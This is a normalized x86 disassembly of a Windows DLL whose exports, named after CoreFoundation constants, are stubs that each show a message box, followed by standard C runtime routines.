xor eax eax
retn
kCFStringTransformHiraganaKatakana
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinArabic
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinCyrillic
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinGreek
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinHangul
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinHebrew
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinHiragana
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinKatakana
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformLatinThai
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformMandarinLatin
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformStripCombiningMarks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformStripDiacritics
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformToLatin
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformToUnicodeName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFStringTransformToXMLHex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFTimeZoneSystemTimeZoneDidChangeNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFTypeArrayCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFTypeBagCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFTypeDictionaryKeyCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFTypeDictionaryValueCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFTypeSetCallBacks
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLAttributeModificationDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLContentAccessDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLContentModificationDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLCreationDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLCustomIconKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLEffectiveIconKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileAllocatedSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileDirectoryContents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileExists
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileLastModificationTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileLength
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileOwnerID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFilePOSIXMode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeBlockSpecial
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeCharacterSpecial
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeNamedPipe
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeRegular
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeSocket
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeSymbolicLink
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileResourceTypeUnknown
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileSecurityKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLFileSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLHTTPStatusCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLHTTPStatusLine
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLHasHiddenExtensionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsAliasFileKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsDirectoryKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsExcludedFromBackupKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsExecutableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsHiddenKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsMountTriggerKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsPackageKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsReadableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsRegularFileKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsSymbolicLinkKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsSystemImmutableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsUbiquitousItemKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsUserImmutableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsVolumeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLIsWritableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLKeysOfUnsetValuesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLLabelColorKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLLabelNumberKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLLinkCountKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLLocalizedLabelKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLLocalizedNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLLocalizedTypeDescriptionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLParentDirectoryURLKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLPreferredIOBlockSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLTotalFileAllocatedSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLTotalFileSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLTypeIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLUbiquitousItemHasUnresolvedConflictsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLUbiquitousItemIsDownloadedKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLUbiquitousItemIsDownloadingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLUbiquitousItemIsUploadedKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLUbiquitousItemIsUploadingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLUbiquitousItemPercentDownloadedKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLUbiquitousItemPercentUploadedKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeAvailableCapacityKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeCreationDateKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIdentifierKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsAutomountedKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsBrowsableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsEjectableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsInternalKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsJournalingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsLocalKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsReadOnlyKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeIsRemovableKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeLocalizedFormatDescriptionKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeLocalizedNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeMaximumFileSizeKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeNameKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeResourceCountKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsAdvisoryFileLockingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsCasePreservedNamesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsCaseSensitiveNamesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsExtendedSecurityKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsHardLinksKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsJournalingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsPersistentIDsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsRenamingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsRootDirectoryDatesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsSparseFilesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsSymbolicLinksKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsVolumeSizesKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeSupportsZeroRunsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeTotalCapacityKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeURLForRemountingKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeURLKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFURLVolumeUUIDStringKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFUseCollectableAllocator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFXMLTreeErrorDescription
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFXMLTreeErrorLineNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFXMLTreeErrorLocation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
kCFXMLTreeErrorStatusCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
windows_msg
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
sub_1000af78
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000af4d
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1000af90
push 0x8
call sub_1000b726
pop ecx
retn
sub_1000af99
push 0x8
call sub_1000b64d
pop ecx
retn
sub_1000b1bb
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1000b64d
pop ecx
sub_1000b1d0
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_1000b090
add esp 0xc
pop ebp
retn
sub_1000b1e6
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1000b090
add esp 0xc
pop ebp
retn
sub_1000b1fc
push 0x1
push 0x0
push 0x0
call sub_1000b090
add esp 0xc
retn
sub_1000b20b
mov edi edi
push ebp
mov ebp esp
call sub_1000c794
push [ ebp + 0x8 ]
call sub_1000c5e5
pop ecx
push 0xff
call sub_1000b1e6
int3
sub_1000b302
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1000bbdd
sub_1000b460
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_1000d0c2
pop ecx
pop ecx
retn
sub_1000b64d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000b71d
push 0xa
call sub_1000b64d
pop ecx
retn
sub_1000b759
push 0x8
push r--data
call sub_1000c3d0
call sub_1000bd47
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1000d185
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1000b779
xor eax eax
inc eax
retn
sub_1000b77d
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d185
sub_1000b792
push sub_1000b759
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_1000b7a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1000b7f8
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_1000b96c
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1000b64d
pop ecx
sub_1000b9a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000b9b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000b9c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000bb50
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000bb23
add esp 0x14
retn
sub_1000bb60
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000bb97
push 0x0
call [ EncodePointer@IAT ]
retn
sub_1000bba0
call [ TlsAlloc@IAT ]
retn 0x4
sub_1000bcbc
push 0xd
call sub_1000b64d
pop ecx
retn
sub_1000bcc5
push 0xc
call sub_1000b64d
pop ecx
retn
sub_1000be7b
push 0xd
call sub_1000b64d
pop ecx
retn
sub_1000be87
push 0xc
call sub_1000b64d
pop ecx
retn
sub_1000c1ec
call sub_1000af99
retn
sub_1000c1f2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000c1b6
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_1000c39b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_1000c415
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1000cf46
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_1000cf64
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_1000d17d
and [ rw-data ] 0x0
retn
sub_1000d977
push 0xc
call sub_1000b64d
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1000dc41
push 0xd
call sub_1000b64d
pop ecx
retn
sub_1000e010
push 0xd
call sub_1000b64d
pop ecx
retn
sub_1000e049
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1000deaf
pop ecx
mov [ rw-data ] 0x1
sub_1000e09a
push 0x2
call sub_1000b20b
sub_1000e186
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_1000e0b0
add esp 0xc
pop ebp
retn 0x4
sub_1000e1b9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1000f3e5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1000e1eb
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_1000e0b0
add esp 0xc
pop ebp
retn 0x8
sub_1000e87b
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_1000e828
add esp 0x10
pop ebp
retn
sub_1000e996
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1000e9c6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000f410
sub_1000f3b9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1000f2f0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000f404
call eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
